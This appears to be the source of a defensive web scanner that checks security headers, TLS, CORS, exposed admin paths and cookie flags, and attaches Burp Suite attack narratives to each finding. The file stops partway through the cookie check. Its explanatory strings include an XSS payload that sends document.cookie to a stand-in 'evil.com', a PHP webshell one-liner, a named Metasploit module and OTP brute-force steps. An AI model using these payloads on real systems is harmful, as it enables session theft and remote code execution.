"""
Direct HTTP security checks — always run regardless of Nuclei.
Each check returns a finding dict with attacker impact narrative.
SSL Labs deep TLS analysis for Cloudflare-protected and all HTTPS sites.
"""
import ssl
import socket
import json
import time
import urllib.request
import urllib.error
from datetime import datetime, timezone

TIMEOUT = 10

# Burp Suite tool info keyed by check id
BURP_INFO = {
    "ssl": {
        "tool": "Burp Suite Scanner + Proxy",
        "how": "An attacker sets up Burp Proxy to intercept HTTPS traffic. With an invalid or missing cert, the browser throws a warning — attackers on the same network can serve their own cert and read all traffic in plaintext inside Burp's HTTP history.",
        "academy_topic": "TLS / Transport Layer Security",
        "academy_path": "https://portswigger.net/web-security",
    },
    "hsts": {
        "tool": "Burp Suite Proxy (SSL Strip)",
        "how": "The attacker fires up Burp Proxy and uses the 'SSL Pass Through' or a custom match-and-replace rule to strip 'https://' from links, silently downgrading your users to plain HTTP. Without HSTS the browser accepts this. Every request is then visible in Burp's HTTP History tab — cookies, passwords, session tokens.",
        "academy_topic": "HTTP request smuggling / Transport attacks",
        "academy_path": "https://portswigger.net/web-security/request-smuggling",
    },
    "csp": {
        "tool": "Burp Suite Scanner + Repeater + DOM Invader",
        "how": "Burp's active scanner automatically flags missing CSP and attempts XSS payloads. The attacker then uses Burp Repeater to craft a payload like <script>document.location='https://evil.com?c='+document.cookie</script> — with no CSP to block it, the browser executes it and sends session cookies to the attacker. Burp's DOM Invader extension maps every injection point automatically.",
        "academy_topic": "Cross-site scripting (XSS)",
        "academy_path": "https://portswigger.net/web-security/cross-site-scripting",
    },
    "xframe": {
        "tool": "Burp Suite Clickbandit",
        "how": "Burp ships a built-in tool called Clickbandit (Burp menu → Burp Clickbandit). The attacker pastes your URL, records a click sequence (e.g. 'confirm payment'), then Clickbandit generates an HTML file that overlays your site invisibly inside an iframe. When a victim visits the attacker's page and clicks anywhere, they're actually clicking your buttons without knowing it.",
        "academy_topic": "Clickjacking",
        "academy_path": "https://portswigger.net/web-security/clickjacking",
    },
    "xcto": {
        "tool": "Burp Suite Repeater + Intruder",
        "how": "The attacker uses Burp Repeater to upload a file containing a hidden <script> tag disguised as a JPG. Without X-Content-Type-Options: nosniff the browser sniffs the content and may execute it as JavaScript. Burp's Intruder can fuzz upload endpoints automatically to find which file types are accepted.",
        "academy_topic": "File upload vulnerabilities",
        "academy_path": "https://portswigger.net/web-security/file-upload",
    },
    "referrer": {
        "tool": "Burp Suite Proxy (HTTP History)",
        "how": "The attacker sits in Burp Proxy and watches the HTTP History tab. Every time a user navigates from your site to an external resource (image, script, analytics), the full Referer header is logged — potentially leaking private URLs like /account/reset-password?token=abc123 or /admin/users/42.",
        "academy_topic": "Information disclosure",
        "academy_path": "https://portswigger.net/web-security/information-disclosure",
    },
    "permissions": {
        "tool": "Burp Suite Scanner + Browser exploit",
        "how": "If the attacker manages to get JavaScript running on your page (via XSS or a compromised ad), the absence of a Permissions-Policy means that script can silently call navigator.geolocation.getCurrentPosition(), request camera access, or read the clipboard — all without any browser-level policy blocking it. Burp Scanner flags the missing header; exploitation happens in the browser.",
        "academy_topic": "Cross-site scripting (XSS)",
        "academy_path": "https://portswigger.net/web-security/cross-site-scripting",
    },
    "server_disclosure": {
        "tool": "Burp Suite Target > Site Map + Scanner",
        "how": "The attacker sends a single request through Burp Proxy and reads the Server / X-Powered-By headers in the response. They now know you're running e.g. 'Apache/2.4.49' — a version with a known path traversal CVE (CVE-2021-41773). Burp Scanner then runs targeted active checks for that exact software version.",
        "academy_topic": "Information disclosure",
        "academy_path": "https://portswigger.net/web-security/information-disclosure",
    },
}

# SSL Labs deep-scan Burp info entries
BURP_TLS_OLD = {
    "tool": "Burp Suite Proxy + TLS Poodle PoC",
    "how": "The attacker forces a TLS downgrade to 1.0 or 1.1 by intercepting the ClientHello in Burp's Proxy and modifying the supported_versions field. Once on TLS 1.0/1.1 they can exploit BEAST (CBC cipher padding oracle) to decrypt session cookies byte-by-byte. In Burp Repeater the attacker replays requests with modified padding until the session token is recovered.",
    "academy_topic": "TLS / Transport Layer Security",
    "academy_path": "https://portswigger.net/web-security",
}
BURP_WEAK_CIPHER = {
    "tool": "Burp Suite Proxy + Wireshark",
    "how": "The attacker uses Burp Proxy alongside Wireshark to capture TLS traffic and identify CBC cipher handshakes. Weak ciphers (3DES, RC4, CBC without AEAD) can be broken with a BEAST or Lucky13 attack — the attacker records thousands of encrypted blocks and uses Burp Repeater to craft block-aligned boundary requests that leak plaintext byte-by-byte.",
    "academy_topic": "TLS / Transport Layer Security",
    "academy_path": "https://portswigger.net/web-security",
}
BURP_BEAST = {
    "tool": "Burp Suite Proxy (BEAST PoC)",
    "how": "BEAST (Browser Exploit Against SSL/TLS) targets TLS 1.0 + CBC ciphers. The attacker injects JavaScript into any same-origin resource on the victim's browser to perform a chosen-plaintext attack. They use Burp Proxy to intercept the CBC-encrypted blocks and — by controlling part of the plaintext — recover the session cookie within minutes. Modern TLS 1.2/1.3 with AEAD ciphers is immune.",
    "academy_topic": "TLS / Transport Layer Security",
    "academy_path": "https://portswigger.net/web-security",
}
BURP_POODLE = {
    "tool": "Burp Suite Proxy (POODLE PoC)",
    "how": "POODLE (Padding Oracle On Downgraded Legacy Encryption) exploits SSLv3's CBC padding. The attacker forces a protocol downgrade through Burp's match-and-replace rules and uses a JavaScript injected in the browser to make 256 crafted requests per byte of the session cookie. With an average of 128 requests per byte, a 32-byte cookie takes ~4,096 requests — automated easily in Burp Intruder.",
    "academy_topic": "TLS / Transport Layer Security",
    "academy_path": "https://portswigger.net/web-security",
}
BURP_HEARTBLEED = {
    "tool": "Burp Suite + Heartbleed Extension",
    "how": "The attacker installs the Heartbleed Burp extension (BApp Store). One click sends a malformed heartbeat request that tricks the server into leaking up to 64KB of RAM — which may contain private keys, session tokens, plaintext passwords, or database credentials from other users' requests. No authentication required. The attack leaves no trace in access logs.",
    "academy_topic": "TLS / Transport Layer Security",
    "academy_path": "https://portswigger.net/web-security",
}
BURP_DROWN = {
    "tool": "Burp Suite Scanner + SSLv2 PoC",
    "how": "DROWN works by using SSLv2 on any server sharing the same private key. The attacker sends specially crafted SSLv2 export cipher handshakes to the vulnerable server, which acts as a decryption oracle. Burp Scanner flags the SSLv2 exposure; the actual decryption uses cross-protocol stolen ciphertext from the TLS server — recovering session tokens from TLS connections without touching TLS at all.",
    "academy_topic": "TLS / Transport Layer Security",
    "academy_path": "https://portswigger.net/web-security",
}
BURP_NO_HSTS_SSL = {
    "tool": "Burp Suite Proxy (SSL Strip)",
    "how": "Even if the server sends HSTS in an HTTP response, without HSTS the browser has no memory of this policy on first visit. The attacker positions Burp as a MitM on public Wi-Fi and uses a match-and-replace rule to strip 'https://' links to 'http://' before they reach the browser. The browser happily follows the downgraded link — Burp HTTP History logs every cookie and credential in plaintext.",
    "academy_topic": "HTTP request smuggling / Transport attacks",
    "academy_path": "https://portswigger.net/web-security/request-smuggling",
}
BURP_LOGJAM = {
    "tool": "Burp Suite Proxy + LogJam PoC",
    "how": "Logjam targets DHE_EXPORT key exchanges. The attacker MitMs the TLS handshake via Burp Proxy and downgrades the server to 512-bit 'export-grade' Diffie-Hellman. Using precomputed discrete log tables (feasible on commodity hardware), the attacker decrypts the session key in real time and reads the entire HTTPS session in Burp's HTTP History — effectively breaking HTTPS silently.",
    "academy_topic": "TLS / Transport Layer Security",
    "academy_path": "https://portswigger.net/web-security",
}
BURP_FREAK = {
    "tool": "Burp Suite Proxy (FREAK Attack)",
    "how": "FREAK (Factoring RSA Export Keys) forces the server to use 512-bit RSA_EXPORT keys by intercepting the ClientHello in Burp Proxy and stripping all non-export cipher suites. The resulting 512-bit key can be factored in ~7 hours on Amazon EC2. Once factored, the attacker has the session key and can decrypt all captured TLS traffic replayed through Burp Decoder.",
    "academy_topic": "TLS / Transport Layer Security",
    "academy_path": "https://portswigger.net/web-security",
}

# Exposed panel burp info template
BURP_PANEL = {
    "tool": "Burp Suite Intruder + Repeater",
    "how": "The attacker uses Burp Intruder to brute-force the login form with a credential wordlist (rockyou.txt or admin/admin defaults). Burp Repeater lets them manually craft requests — bypassing CSRF tokens, testing SQL injection in the username field, or replaying authenticated sessions. An exposed panel with no rate limiting can be cracked in minutes.",
    "academy_topic": "Authentication vulnerabilities",
    "academy_path": "https://portswigger.net/web-security/authentication",
}

BURP_CORS = {
    "tool": "Burp Suite Repeater + CORS PoC",
    "how": "The attacker crafts a malicious page on evil.com that makes a fetch() request to your API with credentials (cookies). Because CORS reflects any origin or allows credentials with a wildcard, the browser sends the victim's session cookies — and the attacker's page can read the full API response, including account balances, personal data, and auth tokens. Burp Repeater is used to discover the misconfiguration by adding an Origin: header and inspecting the response.",
    "academy_topic": "Cross-origin resource sharing (CORS)",
    "academy_path": "https://portswigger.net/web-security/cors",
}

BURP_COOKIE = {
    "tool": "Burp Suite Proxy (HTTP History + Cookie Editor)",
    "how": "In Burp Proxy, the attacker intercepts responses and inspects Set-Cookie headers. Missing HttpOnly means JavaScript (injected via XSS) can read the cookie with document.cookie and send it to a remote server. Missing Secure means the cookie travels over plain HTTP on redirects or mixed-content loads. Missing SameSite=Strict means the cookie is sent on cross-site requests, enabling CSRF. Burp's Cookie Editor extension makes it trivial to replay stolen cookies.",
    "academy_topic": "Authentication vulnerabilities",
    "academy_path": "https://portswigger.net/web-security/authentication",
}

BURP_RATE_LIMIT = {
    "tool": "Burp Suite Intruder (Sniper / Pitchfork mode)",
    "how": "The attacker loads the login, OTP, or promo redemption endpoint into Burp Intruder and fires thousands of requests per second with no throttling from the server. Sniper mode cycles through a password or promo code wordlist automatically. No rate limiting means credential stuffing, OTP brute force, or bonus code enumeration succeeds in minutes with zero lockout.",
    "academy_topic": "Authentication vulnerabilities",
    "academy_path": "https://portswigger.net/web-security/authentication",
}

BURP_JS_SECRET = {
    "tool": "Burp Suite Target > Site Map + Decoder",
    "how": "Burp Spider automatically crawls all JavaScript files linked from the target and adds them to the Site Map. The attacker then uses Burp's Search (Ctrl+F across all responses) to grep for keywords: 'api_key', 'secret', 'Bearer', 'Authorization'. Once found, the key is decoded with Burp Decoder and used directly against the API — granting the same access as the application itself.",
    "academy_topic": "Information disclosure",
    "academy_path": "https://portswigger.net/web-security/information-disclosure",
}

BURP_SUBDOMAIN = {
    "tool": "Burp Suite Target > Site Map + Intruder (subdomain fuzz)",
    "how": "The attacker loads a subdomain wordlist into Burp Intruder and fuzzes the Host header against the root IP. Discovered subdomains (admin., staging., api., dev.) are added to Burp's scope. These environments often have relaxed security — no WAF, debug endpoints enabled, or older software versions. Burp Scanner then runs full active checks against each discovered subdomain.",
    "academy_topic": "Information disclosure",
    "academy_path": "https://portswigger.net/web-security/information-disclosure",
}

BURP_DIR_LISTING = {
    "tool": "Burp Suite Spider + Repeater",
    "how": "Burp Spider automatically crawls directories and detects 'Index of /' pages that expose the full server file tree. The attacker uses Burp Repeater to browse any path — finding config files, PHP source, database backups, or upload directories. From there, Burp Intruder fuzzes filenames to download arbitrary files without authentication.",
    "academy_topic": "Information disclosure",
    "academy_path": "https://portswigger.net/web-security/information-disclosure",
}

BURP_UNAUTH_UPLOAD = {
    "tool": "Burp Suite Repeater + Intruder",
    "how": "The attacker intercepts a file upload request in Burp Proxy and sends it to Repeater. They replace the legitimate PDF/image with a PHP webshell (<?php system($_GET['cmd']); ?>) and change the filename to shell.php. If the server accepts and stores the file without authentication or extension validation, the attacker browses to the uploaded path and executes system commands — achieving full Remote Code Execution on the server.",
    "academy_topic": "File upload vulnerabilities",
    "academy_path": "https://portswigger.net/web-security/file-upload",
}

BURP_OTP_BRUTEFORCE = {
    "tool": "Burp Suite Intruder (Sniper mode)",
    "how": "The attacker captures an OTP verification request in Burp Proxy and sends it to Intruder. They set the OTP value as the payload position and load a numeric wordlist from 000000 to 999999 (1,000,000 combinations). With no rate limiting or lockout, Intruder fires requests at full speed — typically cracking a 6-digit OTP in under 30 minutes. On success, the server returns the victim's account credentials in the response body.",
    "academy_topic": "Authentication vulnerabilities",
    "academy_path": "https://portswigger.net/web-security/authentication/other-mechanisms",
}

BURP_EOL_SOFTWARE = {
    "tool": "Burp Suite Scanner + CVE databases (Metasploit / ExploitDB)",
    "how": "Burp's passive scanner reads the Server and X-Powered-By headers to fingerprint exact software versions. End-of-life versions (PHP 5.x, Apache 2.2.x) have dozens of published CVEs with working public exploits on ExploitDB and Metasploit Framework. The attacker simply loads the matching Metasploit module (e.g. exploit/multi/http/php_cgi_arg_injection for PHP 5.3/5.4) and runs it directly against the target — no custom exploit development required.",
    "academy_topic": "Information disclosure",
    "academy_path": "https://portswigger.net/web-security/information-disclosure",
}

BURP_STRIPE_TEST_KEY = {
    "tool": "Burp Suite Target > Site Map + Stripe API",
    "how": "Burp Spider crawls the application and the attacker searches HTTP History for 'pk_test_' or 'sk_test_'. A publishable test key (pk_test_) confirms the payment gateway is in test mode on a live site — meaning real customer charges may be processed against test infrastructure with no actual money movement, allowing fraudulent bookings. A secret test key (sk_test_) found in source gives full API access to create charges, refunds, and read customer payment data via Stripe's API.",
    "academy_topic": "Information disclosure",
    "academy_path": "https://portswigger.net/web-security/information-disclosure",
}

BURP_PLAINTEXT_CRED = {
    "tool": "Burp Suite Proxy (HTTP History) + Intruder",
    "how": "The attacker intercepts OTP verification responses in Burp Proxy and finds the server returning the account password in the response body. They use Burp Intruder to brute-force valid OTP codes (000000–999999) with no rate limiting — on a correct guess, the response contains the plaintext password, giving full account access. This also confirms passwords are stored in plaintext or reversibly encrypted in the database.",
    "academy_topic": "Authentication vulnerabilities",
    "academy_path": "https://portswigger.net/web-security/authentication",
}

BURP_UNAUTH_API = {
    "tool": "Burp Suite Repeater + Intruder (IDOR)",
    "how": "The attacker captures API requests (e.g. cancel.php, booking endpoints) in Burp Proxy and sends them to Repeater. Without authentication checks server-side, they change booking IDs or user IDs and replay — cancelling other users' bookings, reading private data, or triggering actions on accounts they don't own. Burp Intruder automates the ID enumeration, scanning thousands of records in minutes.",
    "academy_topic": "Insecure direct object references (IDOR)",
    "academy_path": "https://portswigger.net/web-security/access-control/idor",
}

BURP_CRTSH = {
    "tool": "crt.sh + Burp Suite Target Scope",
    "how": "The attacker queries crt.sh (certificate transparency logs) for all SSL certificates ever issued for the target domain — revealing every subdomain that has ever been publicly served, including dev, staging, legacy, and internal apps. Each discovered subdomain is added to Burp's target scope and scanned. Legacy subdomains often run unpatched software, have open directory listings, or expose admin panels removed from the main site.",
    "academy_topic": "Information disclosure",
    "academy_path": "https://portswigger.net/web-security/information-disclosure",
}

BURP_PROMO = {
    "tool": "Burp Suite Repeater + Intruder",
    "how": "The attacker intercepts a promo/bonus redemption request in Burp Proxy, sends it to Repeater and replays it with modified parameters (changing promo codes, user IDs, or amounts). Burp Intruder then automates code enumeration — cycling through alphanumeric promo codes until valid ones are discovered. No rate limiting + predictable code formats = free credits at scale.",
    "academy_topic": "Business logic vulnerabilities",
    "academy_path": "https://portswigger.net/web-security/logic-flaws",
}

CHECKS = [
    {
        "id": "hsts",
        "name": "HTTP Strict Transport Security (HSTS)",
        "category": "Transport Security",
        "severity_fail": "high",
        "header": "strict-transport-security",
        "attacker_can": "Intercept your traffic by tricking browsers into using plain HTTP instead of HTTPS — a classic downgrade or man-in-the-middle attack on public Wi-Fi.",
        "attacker_cannot": "Force your browser onto plain HTTP — all connections stay encrypted even if someone tampers with links.",
        "recommendation": "Add header: Strict-Transport-Security: max-age=31536000; includeSubDomains",
    },
    {
        "id": "csp",
        "name": "Content Security Policy (CSP)",
        "category": "Injection Defence",
        "severity_fail": "high",
        "header": "content-security-policy",
        "attacker_can": "Inject malicious scripts into your pages (Cross-Site Scripting / XSS) and steal session cookies, credentials, or redirect users to phishing sites.",
        "attacker_cannot": "Run unauthorised scripts on your pages — the browser blocks anything not on your approved list.",
        "recommendation": "Add a Content-Security-Policy header defining trusted script/style sources.",
    },
    {
        "id": "xframe",
        "name": "Clickjacking Protection (X-Frame-Options)",
        "category": "UI Redress",
        "severity_fail": "medium",
        "header": "x-frame-options",
        "attacker_can": "Load your website invisibly inside an iframe on a malicious page and trick users into clicking buttons they can't see — stealing clicks, approving transactions, or changing settings.",
        "attacker_cannot": "Embed your site in a hidden iframe — browsers refuse to load it inside other pages.",
        "recommendation": "Add header: X-Frame-Options: DENY (or SAMEORIGIN if framing on your own domain is needed).",
    },
    {
        "id": "xcto",
        "name": "MIME-Type Sniffing Protection (X-Content-Type-Options)",
        "category": "Content Security",
        "severity_fail": "medium",
        "header": "x-content-type-options",
        "attacker_can": "Upload a file containing hidden JavaScript and trick older browsers into executing it as a script by exploiting MIME-type guessing.",
        "attacker_cannot": "Trick browsers into misinterpreting file types — content is always treated as declared.",
        "recommendation": "Add header: X-Content-Type-Options: nosniff",
    },
    {
        "id": "referrer",
        "name": "Referrer Policy",
        "category": "Privacy & Info Leakage",
        "severity_fail": "low",
        "header": "referrer-policy",
        "attacker_can": "See the full URL your users came from (including sensitive path or query parameters) by reading the Referer header your site leaks to third-party resources.",
        "attacker_cannot": "Harvest URL paths from your visitors via the Referer header — the policy controls exactly what gets shared.",
        "recommendation": "Add header: Referrer-Policy: strict-origin-when-cross-origin",
    },
    {
        "id": "permissions",
        "name": "Permissions Policy",
        "category": "Browser Feature Control",
        "severity_fail": "low",
        "header": "permissions-policy",
        "attacker_can": "Abuse browser features like camera, microphone, or geolocation if malicious code runs on your site — there are no restrictions in place to block it.",
        "attacker_cannot": "Silently access camera, microphone, or location via injected scripts — browser features are locked down by policy.",
        "recommendation": "Add header: Permissions-Policy: camera=(), microphone=(), geolocation=()",
    },
    {
        "id": "server_disclosure",
        "name": "Server Technology Disclosure",
        "category": "Information Leakage",
        "severity_fail": "info",
        "header": None,
        "attacker_can": "Identify exactly which web server and version you're running, then look up known exploits for that specific version to target you precisely.",
        "attacker_cannot": "Fingerprint your server stack from response headers — your technology choices stay private.",
        "recommendation": "Remove or obscure the Server and X-Powered-By headers in your web server config.",
    },
]


# Cloudflare IP ranges (updated 2024)
_CF_IP_RANGES = [
    "103.21.244.", "103.22.200.", "103.31.4.", "104.16.", "104.17.",
    "104.18.", "104.19.", "104.20.", "104.21.", "104.22.", "104.23.",
    "104.24.", "104.25.", "104.26.", "104.27.", "104.28.", "108.162.",
    "131.0.72.", "141.101.64.", "141.101.65.", "141.101.66.", "141.101.67.",
    "162.158.", "172.64.", "172.65.", "172.66.", "172.67.", "172.68.",
    "172.69.", "172.70.", "172.71.", "188.114.96.", "188.114.97.",
    "188.114.98.", "188.114.99.", "190.93.240.", "190.93.241.",
    "190.93.242.", "190.93.243.", "197.234.240.", "197.234.241.",
    "198.41.128.", "198.41.129.", "198.41.130.", "198.41.131.",
    "199.27.128.", "199.27.129.", "199.27.130.", "199.27.131.",
]


def _detect_cloudflare(headers: dict, hostname: str) -> dict:
    """
    Detect if the site is behind Cloudflare.
    Returns a dict with is_cloudflare bool and details.
    """
    signals = []
    score = 0

    # Header signals
    server = headers.get("server", "").lower()
    if "cloudflare" in server:
        signals.append("Server: cloudflare header present")
        score += 3
    if "cf-ray" in headers:
        signals.append(f"CF-Ray: {headers['cf-ray']}")
        score += 3
    if "cf-cache-status" in headers:
        signals.append(f"CF-Cache-Status: {headers['cf-cache-status']}")
        score += 2
    if "cf-request-id" in headers:
        signals.append("CF-Request-ID header detected")
        score += 2
    if "__cf_bm" in headers.get("set-cookie", ""):
        signals.append("Cloudflare bot management cookie (__cf_bm)")
        score += 2
    if "expect-ct" in headers and "cloudflare" in headers.get("expect-ct", "").lower():
        signals.append("Expect-CT header from Cloudflare")
        score += 1

    # DNS / IP signal
    try:
        ip = socket.gethostbyname(hostname)
        is_cf_ip = any(ip.startswith(prefix) for prefix in _CF_IP_RANGES)
        if is_cf_ip:
            signals.append(f"IP {ip} is in Cloudflare's address space")
            score += 3
        else:
            signals.append(f"IP {ip} (not a Cloudflare IP — may be direct/CDN)")
    except Exception:
        ip = "unknown"

    is_cloudflare = score >= 3

    return {
        "detected": is_cloudflare,
        "confidence": "High" if score >= 5 else "Medium" if score >= 3 else "Low",
        "signals": signals,
        "ip": ip if "ip" in dir() else "unknown",
        "note": (
            "This site is proxied through Cloudflare. Some security findings (HSTS, security headers) "
            "should be fixed in the Cloudflare Dashboard — not on the origin server. "
            "Origin server IP is hidden behind Cloudflare's network."
        ) if is_cloudflare else (
            "No Cloudflare proxy detected. This appears to be a direct connection to the origin server."
        ),
        "fix_location": "Cloudflare Dashboard (SSL/TLS → Edge Certificates and Security settings)" if is_cloudflare else "Origin web server configuration",
    }


def _fetch(url: str):
    req = urllib.request.Request(url, headers={"User-Agent": "CyberScan/1.0 Security Audit"})
    with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
        headers = {k.lower(): v for k, v in resp.headers.items()}
        return headers, resp.status, resp.url


def _check_ssl(url: str) -> dict:
    from urllib.parse import urlparse
    parsed = urlparse(url)
    base = {
        "id": "ssl",
        "name": "HTTPS / SSL Encryption",
        "category": "Transport Security",
        "burp": BURP_INFO["ssl"],
    }
    if parsed.scheme != "https":
        return {**base, "severity": "critical", "status": "vulnerable",
                "matched_at": url,
                "attacker_can": "Intercept ALL traffic between your users and the server in plain text — passwords, session tokens, personal data — because no encryption is in use.",
                "attacker_cannot": None,
                "recommendation": "Enable HTTPS by installing a TLS certificate (free via Let's Encrypt).",
                "detail": "Site is not served over HTTPS."}
    hostname = parsed.hostname
    port = parsed.port or 443
    try:
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(socket.create_connection((hostname, port), timeout=TIMEOUT), server_hostname=hostname) as s:
            cert = s.getpeercert()
        not_after = datetime.strptime(cert["notAfter"], "%b %d %H:%M:%S %Y %Z").replace(tzinfo=timezone.utc)
        days_left = (not_after - datetime.now(timezone.utc)).days
        if days_left < 0:
            return {**base, "severity": "critical", "status": "vulnerable",
                    "matched_at": url,
                    "attacker_can": "Trigger browser security warnings for all visitors — the certificate has expired so HTTPS trust is broken.",
                    "attacker_cannot": None,
                    "recommendation": "Renew your TLS certificate immediately.",
                    "detail": f"Certificate expired {abs(days_left)} days ago."}
        if days_left < 30:
            return {**base, "severity": "high", "status": "vulnerable",
                    "matched_at": url,
                    "attacker_can": "Exploit the upcoming certificate expiry — once expired, all HTTPS trust breaks and users see security warnings.",
                    "attacker_cannot": None,
                    "recommendation": f"Renew your TLS certificate — expires in {days_left} days.",
                    "detail": f"Certificate expires in {days_left} days."}
        return {**base, "severity": "info", "status": "protected",
                "matched_at": url,
                "attacker_can": None,
                "attacker_cannot": "Intercept traffic in plain text — the connection is encrypted with a valid certificate.",
                "recommendation": None,
                "detail": f"Valid certificate, expires in {days_left} days."}
    except ssl.SSLCertVerificationError as e:
        return {**base, "severity": "critical", "status": "vulnerable",
                "matched_at": url,
                "attacker_can": "Present a fake certificate — browsers warn users that the connection is not trusted.",
                "attacker_cannot": None,
                "recommendation": "Fix the SSL certificate — ensure it's from a trusted CA and matches the domain.",
                "detail": f"SSL verification failed: {e}"}
    except Exception:
        return {**base, "severity": "info", "status": "protected",
                "matched_at": url,
                "attacker_can": None,
                "attacker_cannot": "Intercept traffic — HTTPS is in use.",
                "recommendation": None, "detail": "HTTPS in use."}


def _is_soft_404(body: str, status: int, path: str) -> bool:
    """Detect if a 200 response is actually a soft 404 (SPA catchall or custom error page)."""
    if status != 200:
        return False
    body_lower = body.lower()
    soft_404_signals = [
        "page not found", "404", "not found", "doesn't exist", "does not exist",
        "page doesn't exist", "oops", "went wrong", "no page", "can't find",
        "cannot find", "error 404", "page is missing",
    ]
    signal_count = sum(1 for s in soft_404_signals if s in body_lower)
    return signal_count >= 2


def _fetch_body(url: str, timeout: int = 5) -> tuple:
    """Returns (status, body_str, headers_dict). Catches HTTPError too."""
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "CyberScan/1.0 Security Audit"})
        with urllib.request.urlopen(req, timeout=timeout) as r:
            body = r.read(8192).decode("utf-8", errors="ignore")
            headers = {k.lower(): v for k, v in r.headers.items()}
            return r.status, body, headers
    except urllib.error.HTTPError as e:
        return e.code, "", {}
    except Exception:
        return 0, "", {}


def _check_exposed_panels(base_url: str) -> list:
    paths = [
        ("/admin", "Admin Panel"),
        ("/wp-admin", "WordPress Admin"),
        ("/wp-login.php", "WordPress Login"),
        ("/administrator", "Joomla Admin"),
        ("/phpmyadmin", "phpMyAdmin"),
        ("/login", "Login Page"),
        ("/.env", "Environment Config File"),
        ("/config.php", "PHP Config File"),
        ("/server-status", "Apache Server Status"),
    ]
    findings = []
    base = base_url.rstrip("/")

    # Get homepage fingerprint to detect soft 404s
    _, homepage_body, _ = _fetch_body(base)
    homepage_len = len(homepage_body)

    for path, label in paths:
        status, body, headers = _fetch_body(base + path)
        if status != 200:
            continue
        # Skip soft 404s — SPA returning homepage or custom 404 page
        if _is_soft_404(body, status, path):
            continue
        # Skip if body is suspiciously similar to homepage (SPA catchall)
        body_len = len(body)
        if homepage_len > 0 and abs(body_len - homepage_len) < 500:
            continue
        # For .env and config files, also verify content looks like config
        if path in ("/.env", "/config.php"):
            config_signals = ["password", "secret", "key", "db_", "database", "<?php", "define(", "host="]
            if not any(s in body.lower() for s in config_signals):
                continue

        findings.append({
            "id": f"exposed_{path.strip('/').replace('/', '_') or 'panel'}",
            "name": f"Exposed {label}",
            "category": "Exposed Panels",
            "severity": "critical" if ".env" in path or "config" in path else "high",
            "status": "vulnerable",
            "matched_at": base + path,
            "attacker_can": f"Access the {label} at {path} without any restriction — this could allow full account takeover, credential theft, or database access.",
            "attacker_cannot": None,
            "recommendation": f"Restrict access to {path} by IP, add authentication, or remove it if unused.",
            "detail": f"HTTP 200 returned from {path} (confirmed real content, not soft 404)",
            "burp": BURP_PANEL,
        })
    return findings


def _check_cors(url: str) -> dict:
    """Test for CORS misconfiguration by sending a spoofed Origin header."""
    import urllib.parse
    base = {
        "id": "cors",
        "name": "CORS (Cross-Origin Resource Sharing) Policy",
        "category": "Access Control",
        "burp": BURP_CORS,
    }
    evil_origin = "https://evil-attacker.com"
    try:
        req = urllib.request.Request(
            url,
            headers={
                "User-Agent": "CyberScan/1.0 Security Audit",
                "Origin": evil_origin,
            },
        )
        with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
            headers = {k.lower(): v for k, v in resp.headers.items()}

        acao = headers.get("access-control-allow-origin", "")
        acac = headers.get("access-control-allow-credentials", "").lower()

        if acao == "*" and acac == "true":
            return {**base, "severity": "critical", "status": "vulnerable",
                    "matched_at": url,
                    "attacker_can": "Make cross-origin requests with victim credentials and READ the full response — ACAO: * combined with credentials:true is the most dangerous CORS misconfiguration. Any website can steal your users' data.",
                    "attacker_cannot": None,
                    "recommendation": "Never combine Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true. Use an explicit allowlist of trusted origins.",
                    "detail": f"Access-Control-Allow-Origin: {acao} | Access-Control-Allow-Credentials: {acac}"}
        elif acao == evil_origin:
            if acac == "true":
                return {**base, "severity": "critical", "status": "vulnerable",
                        "matched_at": url,
                        "attacker_can": "Reflect any attacker origin back and allow credentials — a complete CORS bypass. Any site can impersonate a trusted origin and steal authenticated API responses including account data, tokens and balances.",
                        "attacker_cannot": None,
                        "recommendation": "Validate the Origin header against a strict allowlist. Never reflect arbitrary origins. Do not combine wildcard with credentials.",
                        "detail": f"Server reflected attacker Origin: {evil_origin} with Allow-Credentials: true"}
            else:
                return {**base, "severity": "high", "status": "vulnerable",
                        "matched_at": url,
                        "attacker_can": "Make unauthenticated cross-origin API requests from any domain — the server reflects any origin as trusted. Public API data can be scraped and abused from attacker-controlled sites.",
                        "attacker_cannot": None,
                        "recommendation": "Restrict Access-Control-Allow-Origin to an explicit whitelist of trusted domains. Do not reflect arbitrary origins.",
                        "detail": f"Server reflected attacker Origin: {evil_origin}"}
        elif acao == "*":
            return {**base, "severity": "medium", "status": "vulnerable",
                    "matched_at": url,
                    "attacker_can": "Make cross-origin requests from any domain to access public API endpoints — useful for data scraping, API abuse, and as a stepping stone if XSS is found.",
                    "attacker_cannot": "Read authenticated responses — wildcard cannot be combined with credentials.",
                    "recommendation": "Restrict CORS to specific trusted origins rather than using a wildcard, even for public APIs.",
                    "detail": "Access-Control-Allow-Origin: * (wildcard — any origin can make requests)"}
        else:
            return {**base, "severity": "info", "status": "protected",
                    "matched_at": url,
                    "attacker_can": None,
                    "attacker_cannot": "Make cross-origin requests from arbitrary domains — CORS is either absent or correctly restricted.",
                    "recommendation": None,
                    "detail": f"ACAO: '{acao}' — attacker origin was not reflected."}
    except Exception as e:
        return {**base, "severity": "info", "status": "protected",
                "matched_at": url,
                "attacker_can": None,
                "attacker_cannot": None,
                "recommendation": None,
                "detail": f"CORS check skipped: {e}"}


def _check_cookie_security(headers: dict, url: str) -> list:
    """Inspect Set-Cookie headers for missing security flags."""
    findings = []
    raw_cookies = headers.get("set-cookie", "")
    if not raw_cookies:
        return findings

    # Some servers send multiple Set-Cookie as comma-joined in urllib
    cookies = [c.strip() for c in raw_cookies.split(",") if "=" in c.split(";")[0]]

    SESSION_NAMES = {"session", "sessionid", "sess", "sid", "auth", "token",
                     "jwt", "access_token", "refresh_token", "phpsessid",
                     "laravel_session", "user_session", "login", "remember"}

    for cookie in cookies:
        parts = [p.strip().lower() for p in cookie.split(";")]
        cookie_name = parts[0].split("=")[0].strip().lower() if parts else ""
        is_session = any(s in cookie_name for s in SESSION_NAMES)
        severity_base = "high" if is_session else "medium"

        has_httponly = any(p == "httponly" for p in parts)
        has_secure = any(p == "secure" for p in parts)
        has_samesite = any(p.startswith("samesite") for p in parts)

        issues = []
        if not has_httponly:
            issues.append("HttpOnly missing")
        if not has_secure:
            issues.append("Secure missing")
        if not has_samesite:
            issues.append("SameSite missing")

        if issues:
            label = f"'{cookie_name}'" if cookie_name else "session"
            findings.append({
